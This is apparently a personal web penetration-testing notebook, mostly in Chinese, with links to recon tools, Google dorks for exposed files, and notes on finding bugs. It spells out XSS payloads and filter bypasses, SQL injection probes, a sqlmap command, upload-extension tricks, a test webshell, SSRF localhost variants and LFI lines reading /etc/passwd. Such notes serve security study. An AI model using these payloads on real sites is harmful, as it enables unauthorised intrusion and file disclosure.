Web_PT
===

Table of Contents
====
*  [別的大神的筆記資源](#別的大神的筆記資源)
*  [Tools](#tools)
    *  [別的大神整理的工具](#別的大神整理的工具)
    *  [OSINT/Recon](#OSINT)
        *  [image](#image)
        *  [DNS/IP](#DNS/IP)
        *  [web_info](#web_info)
        *  [mail](#mail)
    *  [convert](#convert)  
*  [Information Leakage & search for vulnerbility](#Information-Leakage-&-search-for-vulnerbility) 
    *  [Google Haking](#Google-Haking)
    *  [web leak information](#web-leak-information)
*  [WEB exploitation](#WEB-exploitation) 
    *  [XSS](#XSS)
    *  [SQL injection](#SQL-injection)
    *  [LFI/upload](#LFI)
    *  [SSRF](#SSRF)

# 別的大神的筆記資源
- https://github.com/wiiwu959/Pentest-Record
- https://github.com/stevenyu113228/My-Security-Resources
- https://github.com/we1h0/redteam-tips
- https://github.com/Wh0ale/SRC-experience
- https://github.com/0verSp4ce/DoraBox
- 

# Tools

## 別的大神整理的工具
- https://github.com/infosecn1nja/Red-Teaming-Toolkit
- https://github.com/safe6Sec/PentestNote
- https://github.com/ghealer/TaoTie
- 
## OSINT/Recon

- https://github.com/Paper-Pen/GatherInfo

### image
- https://tineye.com/
- https://pimeyes.com/en

### DNS/IP
- https://sitereport.netcraft.com/
- https://omnisint.io/
- https://dnsdumpster.com/
- https://securitytrails.com/dns-trails
- https://talosintelligence.com/reputation_center/
- https://ip.chinaz.com/
- https://www.ipaddress.com/
- https://www.twnic.tw/whois_n.php
- https://mxtoolbox.com/SuperTool.aspx
- https://whois.tanet.edu.tw/
- https://www.ez2o.com/App/Net/IP
- https://tools.keycdn.com/traceroute

### web_info
- https://www.webhostingsecretrevealed.net/zh-TW/#whs_results=https://teyhp.com/
- https://www.virustotal.com/gui/home/url
- https://crt.sh/
- https://builtwith.com/zh/
- https://web.archive.org/

### mail
- https://verify-email.org/
- https://mxtoolbox.com/EmailHeaders.aspx
- https://www.ipaddress.com/trace-email.html

## convert
- https://www.asciitohex.com/
- https://gchq.github.io/CyberChef/

## fingerprint information
- 目標資產偵察 : https://intelx.io/
- 情報蒐查 : https://phonebook.cz/


# Information Leakage & search for vulnerbility

## Google Hacking
 
- https://www.exploit-db.com/
- https://dorksearch.com/
- https://pentest-tools.com/information-gathering/google-hacking#
 
   ```
   - index of:/robots.txt
   - index of:/.svn
   - index of:/.git
   - inurl:/.htaccess
   
   - inurl:/access.log
   - inurl:"admin"
   
   - inurl:"admin.php"
   - inurl:"login.aspx"
   - inurl:"login.php"
   
   - inurl:"phpMyAdmin"
   - inurl:"access.log"
   - inurl:
   
   - 運用inurl特性靈活過濾:臺灣domain: inurl:.tw、site:.tw
   ```
## web leak information

- JS Leak  :https://github.com/Roc-L8/JSFinderPlus

## sensitive directory/path

- .git 
- .svn 
- robots.txt
- .htaccess 
- web.config
 
# WEB exploitation

- https://github.com/splitline/How-to-Hack-Websites

## XSS

- https://github.com/BlackFan/content-type-research

跨站腳本攻擊是目前我尋找的網頁漏洞最多的之一，其中以反射型XSS為最大宗

### 心得與找security bug的方法:

1.找到注入點:

反射型XSS常出現在`搜尋框`、`url`、`登入頁面`**(出現在GET參數後機率高)**

儲存型XSS常出現在`留言板` **(可以用Google Hacking搜尋`intext:"留言板" AND site:xxx.xxx.xxx`、`intitle:"留言板 AND site:xxx.xxx.xxx"`)**

2.注入基本payload觀察回應:

我自己常用 ``` "><script>alert(1)</script> ```，常會出現以下情況:

    - 直接噴alert框
    
    - <script>被擋掉 --> 
    
      換tag bypass (<iframe>、<img>)
      
      編碼 bypass (url encode、double url encode、html entities...)
      
      雙tag bypass (<scr<script>ipt>alert(1)</scr</script>ipt>)
      
      大小寫混和 bypass (<ScRiPt>alert(1)</ScRiPt>)
      
      雙tag + 大小寫混和 bypass (<ScR<script>IpT>)

3.利用**滑鼠右鍵** --> **檢查**，找出漏洞可能出現的地方，通常出現在網頁上

4.繼續依照source code修改payload，一邊必須觀察可能的filter，並靈活運用bypass

Basic payload:
```
- "><script>alert(1)</script>
- '>alert(1)</script>
- <iframe onload="alert(1)"></iframe>
- <script>alert(1)</script>
```

## SQL injection

### 心得與找security bug的方法:

```
http://example.com?id=1--

http://example.com?id=1'

http://example.com?id=' or 1=1 --   --> 200
http://example.com?id=' or 1=2 --   --> 404

http://example.com?id=1%27 --> 噴錯意謂著有吃%27進去
```

1.找到注入點:

SQL injection常出現在`搜尋框`、`url`、`登入頁面(有機會非法登入)`**(出現在GET參數後機率高)**

Google Hacking search for SQL injection Vulnerbility:

intext:

2.注入基本payload觀察回應:

我自己常用 **' or 1=1 --** 或 **admin' or 1=1 --**，常會出現以下情況:

- 直接登入

- 帳號密碼錯誤或其它錯誤

- 根本沒東西

### bypass

- 編碼 bypass
    - 空白:%20、+、
- 大小寫混和 bypass
- 註解 bypass(須注意不同DB使用的語法): `--` 可替換為:/**/、#、

### Proof for SQL injection vulnerbility

**GET method:**
```
sqlmap -u "http://example.com?id="  
```

**POST method:**
Use **Burpsuite** to catch the package


## LFI
```
file:///etc/passwd
```

### upload
```
shell.php
shell.pHp
shell.PhP
shell.php;jpg
shell.php.jpg
```

### LFI to RCE

- Test webshell:
    `<?php phpInfo();?>`

## SSRF

### Test for SSRF vulnerbility
```
http://example.com?url={payload}

http://example.com?lang={payload}
```
### Basic payload:
```
127.0.0.1

localhost

192.168.0.1

127.00000.00000.00001

127.0.1

127.1

localhost
```

## SSRF to LFI

```
http://example.com?url=file:///etc/passwd  #for linux OS

http://example.com?url=...
- php://filter/convert.base64-encode/resource=index.php
- php://filter/convert.base64-decode/resource=index.php
```

